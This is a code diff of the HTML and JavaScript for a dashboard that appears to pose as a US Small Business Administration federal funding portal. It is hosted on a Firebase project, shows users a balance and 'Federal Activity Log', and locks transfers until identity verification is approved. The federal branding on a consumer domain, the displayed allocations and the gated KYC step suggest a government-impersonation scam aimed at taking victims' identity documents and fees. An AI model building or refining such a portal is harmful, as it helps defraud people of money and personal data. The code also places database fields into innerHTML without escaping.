@@ -34,16 +34,17 @@
         .status-rejected { background: var(--sba-red) !important; color: white !important; }
 
         .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 10px 15px; max-width: 500px; margin: 0 auto; }
-        .grid-item { background: white; padding: 15px 5px; border-radius: 10px; text-align: center; border: 1px solid #e2e8f0; cursor: pointer; transition: 0.2s; }
+        .grid-item { background: white; padding: 15px 5px; border-radius: 10px; text-align: center; border: 1px solid #e2e8f0; cursor: pointer; transition: 0.2s; position: relative; }
         .grid-item:active { transform: scale(0.95); }
         .grid-item span { display: block; font-size: 20px; margin-bottom: 5px; }
         .grid-item b { font-size: 9px; color: var(--sba-blue); text-transform: uppercase; }
         
-        .is-locked { opacity: 0.4; filter: grayscale(1); cursor: not-allowed !important; }
+        .is-locked { opacity: 0.5; cursor: not-allowed !important; }
+        .lock-icon { position: absolute; top: 5px; right: 5px; font-size: 10px; color: #94a3b8; }
         .is-done { border: 2px solid #10b981; background: #f0fdf4; }
         .is-error { border: 2px solid var(--sba-red); background: #fff1f2; }
 
-        .activity-card { background: white; margin: 20px 15px; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; }
+        .activity-card { background: white; margin: 20px 15px; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; min-height: 100px; }
         .log-title { font-size: 10px; font-weight: 800; color: #64748b; text-transform: uppercase; border-bottom: 1px solid #f1f5f9; padding-bottom: 8px; margin-bottom: 12px; display: flex; justify-content: space-between; }
         .log-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #f8fafc; }
     </style>
@@ -68,7 +69,7 @@
     </div>
 
     <div class="grid-container">
-        <div class="grid-item" id="applyBtn"><span>📝</span><b>Apply</b></div>
+        <div class="grid-item" onclick="location.href='apply.html'"><span>📝</span><b>Apply</b></div>
         <div class="grid-item" id="transferBtn"><span>🏦</span><b>Transfer</b></div>
         <div class="grid-item" onclick="location.href='transactions.html'"><span>📊</span><b>Ledger</b></div>
         <div class="grid-item" id="kycBtn"><span>🛡️</span><b>Verify</b></div>
@@ -79,16 +80,15 @@
     <div class="activity-card">
         <div class="log-title"><span>Federal Activity Log</span><span>SECURE</span></div>
         <div id="activityLog">
-            <p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">Syncing with federal servers...</p>
+            <p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">Establishing secure connection...</p>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, onSnapshot, collection, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, onSnapshot, collection, query, where, orderBy, limit } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        // MATCHED PROJECT CONFIG
         const firebaseConfig = {
             apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
             authDomain: "sba-portal-2026-f1253.firebaseapp.com",
@@ -107,87 +107,90 @@
 
             document.getElementById('caseId').innerText = `CASE ID: SBA-${user.uid.substring(0,8).toUpperCase()}-2026`;
 
-            // 1. LIVE USER LISTENER
+            // 1. FAST LIVE USER LISTENER
             onSnapshot(doc(db, "users", user.uid), (snap) => {
                 if (snap.exists()) {
                     const data = snap.data();
-                    let rawValue = data.balance || 0;
-                    if (typeof rawValue === 'string') rawValue = rawValue.replace(/[$,]/g, '');
-                    const balance = parseFloat(rawValue) || 0;
+                    let bal = parseFloat(data.balance) || 0;
 
-                    document.getElementById('userBalance').innerText = "$" + balance.toLocaleString('en-US', {
+                    document.getElementById('userBalance').innerText = "$" + bal.toLocaleString('en-US', {
                         minimumFractionDigits: 2,
                         maximumFractionDigits: 2
                     });
                     
                     const kycStatus = (data.kycStatus || "NOT STARTED").toUpperCase();
                     const pill = document.getElementById('statusPill');
-                    const applyBtn = document.getElementById('applyBtn');
                     const transferBtn = document.getElementById('transferBtn');
                     const kycBtn = document.getElementById('kycBtn');
 
-                    // RESET STATES
-                    kycBtn.className = "grid-item";
-                    applyBtn.className = "grid-item";
-                    transferBtn.className = "grid-item";
-
+                    // Handle KYC states
                     if(kycStatus === "APPROVED") {
                         pill.innerText = "● ACCOUNT VERIFIED";
                         pill.className = "status-pill status-verified";
                         kycBtn.innerHTML = "<span>✅</span><b>Verified</b>";
-                        kycBtn.classList.add('is-done');
-                        kycBtn.onclick = () => alert("Verification Complete.");
-                        applyBtn.onclick = () => location.href = 'apply.html';
+                        kycBtn.className = "grid-item is-done";
+                        kycBtn.onclick = () => alert("Identity Verification Complete.");
                         
-                        if(balance > 0) {
+                        // Only allow transfer if balance exists and KYC is approved
+                        if(bal > 0) {
+                            transferBtn.classList.remove('is-locked');
+                            transferBtn.innerHTML = "<span>🏦</span><b>Transfer</b>";
                             transferBtn.onclick = () => location.href = 'transfer.html';
                         } else {
                             transferBtn.classList.add('is-locked');
-                            transferBtn.onclick = () => alert("Funding Required.");
+                            transferBtn.innerHTML = "<span>🏦</span><b>Transfer</b><div class='lock-icon'>🔒</div>";
+                            transferBtn.onclick = () => alert("Allocation must be processed first.");
                         }
                     } 
                     else if (["REJECTED", "DECLINED", "DENIED"].includes(kycStatus)) {
                         pill.innerText = "● VERIFICATION REJECTED";
                         pill.className = "status-pill status-rejected";
-                        kycBtn.classList.add('is-error');
+                        kycBtn.className = "grid-item is-error";
                         kycBtn.onclick = () => location.href = 'kyc.html';
-                        applyBtn.classList.add('is-locked');
                         transferBtn.classList.add('is-locked');
+                        transferBtn.onclick = () => alert("Verification rejected. Please contact support.");
                     }
                     else {
-                        pill.innerText = "● PENDING KYC";
+                        pill.innerText = "● PENDING VERIFICATION";
                         kycBtn.onclick = () => location.href = 'kyc.html';
-                        applyBtn.classList.add('is-locked');
                         transferBtn.classList.add('is-locked');
+                        transferBtn.innerHTML = "<span>🏦</span><b>Transfer</b><div class='lock-icon'>🔒</div>";
+                        transferBtn.onclick = () => alert("Verification is required to unlock transfers.");
                     }
                 }
             });
 
-            // 2. LIVE ACTIVITY LOG
-            const qry = query(collection(db, "requests"), where("userId", "==", user.uid), orderBy("timestamp", "desc"));
+            // 2. LIVE ACTIVITY LOG (Shows in dashboard)
+            const qry = query(
+                collection(db, "requests"), 
+                where("userId", "==", user.uid), 
+                orderBy("timestamp", "desc"),
+                limit(5)
+            );
+
             onSnapshot(qry, (snap) => {
                 const logBox = document.getElementById('activityLog');
                 if(snap.empty) {
-                    logBox.innerHTML = `<p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">No recent activity.</p>`;
+                    logBox.innerHTML = `<p style="text-align:center; font-size:10px; color:#94a3b8; padding:20px;">No recent federal activity.</p>`;
                     return;
                 }
                 logBox.innerHTML = "";
                 snap.forEach(d => {
                     const r = d.data();
                     const status = (r.status || 'PENDING').toUpperCase();
-                    let color = "#f59e0b";
-                    if (["SUCCESSFUL", "APPROVED", "COMPLETED"].includes(status)) color = "#10b981";
-                    if (["DENIED", "FAILED", "REJECTED"].includes(status)) color = "#ef4444";
+                    let statusColor = "#f59e0b"; // Pending
+                    if (["SUCCESSFUL", "APPROVED", "COMPLETED"].includes(status)) statusColor = "#10b981";
+                    if (["DENIED", "FAILED", "REJECTED", "DECLINED"].includes(status)) statusColor = "#ef4444";
 
                     logBox.innerHTML += `
                         <div class="log-item">
                             <div>
-                                <b style="font-size:10px;">${(r.type || "REQUEST")}</b><br>
-                                <small style="font-size:8px; color:#94a3b8;">${d.id.substring(0,8)}</small>
+                                <b style="font-size:10px;">${(r.type || "FUNDS REQUEST").replace(/_/g, ' ')}</b><br>
+                                <small style="font-size:8px; color:#94a3b8;">REF: ${d.id.substring(0,8).toUpperCase()}</small>
                             </div>
                             <div style="text-align:right;">
                                 <b style="font-size:11px;">$${parseFloat(r.amount || 0).toLocaleString()}</b><br>
-                                <small style="color:${color}; font-size:9px; font-weight:bold;">${status}</small>
+                                <small style="color:${statusColor}; font-size:9px; font-weight:bold;">${status}</small>
                             </div>
                         </div>`;
                 });
